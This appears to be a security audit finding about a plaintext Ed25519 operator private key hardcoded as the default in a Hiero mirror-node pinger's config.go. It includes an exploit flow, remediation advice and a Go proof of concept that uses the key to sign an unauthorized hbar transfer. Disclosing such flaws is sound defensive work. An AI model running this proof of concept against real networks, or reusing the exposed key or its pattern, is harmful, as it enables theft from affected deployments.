### Title
Hardcoded Operator Private Key in Public Source Enables Unauthorized Transaction Signing Without Approval Gate

### Summary
The file `pinger/config.go` hardcodes a plaintext Ed25519 private key as the default value for `HIERO_MIRROR_PINGER_OPERATOR_KEY`, paired with operator account `0.0.2`. Any observer of the public repository can extract this key and call `hiero.PrivateKeyFromString()` to reconstruct the full private key. The `newClient()` function in `pinger/sdk_client.go` then calls `client.SetOperator(opID, opKey)` with no approval gate, allowing the reconstructed key to sign and submit transactions autonomously on any network where this key controls account `0.0.2`.

### Finding Description
**Code locations:**

- `pinger/config.go:40` — hardcoded default private key literal:
  ```
  "302e020100300506032b65700422042091132178e72057a1d7528025956fe39b0b847f200ab59b2fdd367017f3087137"
  ```
  paired with operator ID default `"0.0.2"` at line 39. The `envOr()` helper (lines 140–145) falls back to this literal whenever `HIERO_MIRROR_PINGER_OPERATOR_KEY` is absent from the environment.

- `pinger/sdk_client.go:40–45` — `newClient()` calls `hiero.PrivateKeyFromString(cfg.operatorKey)` and immediately `client.SetOperator(opID, opKey)` with no challenge, no multi-sig check, no approval callback, and no runtime secret-store lookup.

**Root cause:** A full private key is committed in plaintext to a public repository as a compile-time default. The `newClient()` function treats possession of the key string as sufficient authorization — there is no signer approval gate anywhere in the call chain.

**Exploit flow:**
1. Attacker reads `pinger/config.go` from the public repo (zero privilege required).
2. Attacker copies the key string and calls `hiero.PrivateKeyFromString("302e…7137")` in any Go program using the same SDK.
3. Attacker calls `client.SetOperator(AccountID{0,0,2}, opKey)` on a client pointed at any Hiero/Hedera network where this key is valid for account `0.0.2` (local nodes, custom "other" deployments, or any environment that did not rotate the genesis key).
4. Attacker submits arbitrary `TransferTransaction`, `ContractExecuteTransaction`, etc., signed by the reconstructed key — accepted by the network with no further approval.

**Why existing checks fail:** The only validation in `loadConfig()` (lines 102–107) is a non-empty check on the key string. `SetOperator()` in the Hiero SDK is a pure setter; it performs no on-chain ownership verification. There is no HSM, no threshold-key enforcement, and no multi-party approval step anywhere in `newClient()`.

The same key is also hardcoded in `monitor/src/main/java/org/hiero/mirror/monitor/OperatorProperties.java:20` and `rosetta/test/bdd-client/config.go`, confirming it is treated as a project-wide known default rather than a secret.

### Impact Explanation
On any Hiero network node (local, "other"-mode custom, or any deployment that has not rotated the genesis key away from `0.0.2`), an attacker holding this key can:
- Drain the operator account balance via `TransferTransaction`.
- Execute or deploy contracts under the operator's identity.
- Perform any action the operator account is authorized for, with no approval from legitimate owners.

Severity is **High** for affected deployments. On public testnet/mainnet, Hedera controls account `0.0.2` with a different key, limiting blast radius there; however, any "other"-mode or local deployment using the default is fully compromised.

### Likelihood Explanation
Preconditions require only the ability to read a public GitHub repository — no credentials, no network access to the target, no insider knowledge. The key is a static string that has never changed across the codebase. Any developer, security researcher, or automated scanner can extract and use it in minutes. Repeatability is unlimited.

### Recommendation
1. **Remove the hardcoded key entirely.** Replace the default with `""` and make `loadConfig()` return an error if `HIERO_MIRROR_PINGER_OPERATOR_KEY` is not explicitly set via environment or flag.
2. **Require secret injection at runtime** (e.g., Kubernetes Secret, Vault, AWS Secrets Manager) — never a source-code default.
3. **Rotate account `0.0.2`** on any local or custom network that was started with this well-known genesis key and is reachable from untrusted networks.
4. **Audit all other files** (`OperatorProperties.java`, `rosetta/test/bdd-client/config.go`, `AcceptanceTestProperties.java`) for the same pattern and apply the same fix.

### Proof of Concept
```go
package main

import (
    "fmt"
    hiero "github.com/hiero-ledger/hiero-sdk-go/v2/sdk"
)

func main() {
    // Key extracted verbatim from pinger/config.go:40 (public repo)
    rawKey := "302e020100300506032b65700422042091132178e72057a1d7528025956fe39b0b847f200ab59b2fdd367017f3087137"

    opKey, err := hiero.PrivateKeyFromString(rawKey)
    if err != nil {
        panic(err)
    }

    // Point at any local/custom Hiero node where 0.0.2 uses this genesis key
    client := hiero.ClientForNetwork(map[string]hiero.AccountID{
        "localhost:50211": {Account: 3},
    })
    opID, _ := hiero.AccountIDFromString("0.0.2")
    client.SetOperator(opID, opKey) // no approval gate

    // Submit an unauthorized transfer — signed automatically by the stolen key
    toID, _ := hiero.AccountIDFromString("0.0.1001")
    tx, err := hiero.NewTransferTransaction().
        AddHbarTransfer(opID, hiero.HbarFromTinybar(-10000)).
        AddHbarTransfer(toID, hiero.HbarFromTinybar(10000)).
        Execute(client)
    fmt.Println("Submitted tx:", tx.TransactionID, err)
}
```
